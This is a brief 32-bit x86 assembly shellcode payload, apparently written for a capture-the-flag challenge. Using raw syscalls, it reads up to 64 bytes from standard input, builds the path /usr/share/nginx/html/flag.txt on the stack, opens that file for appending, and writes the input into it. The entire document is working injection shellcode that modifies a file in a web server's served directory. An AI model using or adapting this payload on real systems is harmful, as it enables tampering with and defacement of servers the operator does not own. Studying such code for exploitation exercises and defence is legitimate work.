BITS 32

_start:
	sub	esp, 0x40

	;; read(0, buf, 0x40)
	mov	ebx, 0
	mov	eax, 0x3
	mov	ecx, esp
	mov	esi, esp
	mov	edx, 0x40
	int	0x80

	;; open('/usr/share/nginx/html/flag.txt');
	mov	edi, eax
	xor 	eax, eax
	push	eax
	push	0x7478
	push	0x742e6761
	push	0x6c662f6c
	push	0x6d74682f
	push	0x786e6967
	push	0x6e2f6572
	push	0x6168732f
	push	0x7273752f
	mov	ebx, esp
	mov	eax, 5
	mov	ecx, 1025
	int	0x80

	;; write(fd, buf, 0x40)
	mov	ecx, esi
	mov	ebx, eax
	mov	edx, edi
	mov	eax, 0x4
	int	0x80

exit:
	;; exit(0)
	mov	eax, 1
	mov	ebx, 0
	int	0x80

